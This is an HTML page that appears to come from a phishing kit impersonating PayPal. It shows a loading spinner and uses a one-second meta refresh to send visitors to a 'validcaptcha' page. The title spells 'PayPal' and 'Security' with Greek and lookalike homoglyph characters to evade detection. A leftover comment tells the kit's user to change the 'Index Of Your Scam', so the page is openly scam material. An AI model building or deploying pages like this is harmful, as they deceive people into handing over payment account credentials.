<!DOCTYPE html>

<html>

     <head>
     

  <link href='../../lib/img/favicon.ico' rel='icon' type='image/x-icon'/>

     
<title>&#929;&#945;y&#929;&#945;I Safety & Secuгıty</title>   


<!-- Please Change "Index Of Your Scam" !! --->
<meta content='1;URL=../validcaptcha' http-equiv='refresh'/>

     </head>
<body>
<HEAD> <TITLE>&#929;&#945;y&#929;&#945;l Safety & Security</TITLE> </HEAD>
<BODY>
  <center><p><IMG SRC="../../lib/img/ajax-loader-6.gif"></p></center>
</BODY>
</>
</body

</html>
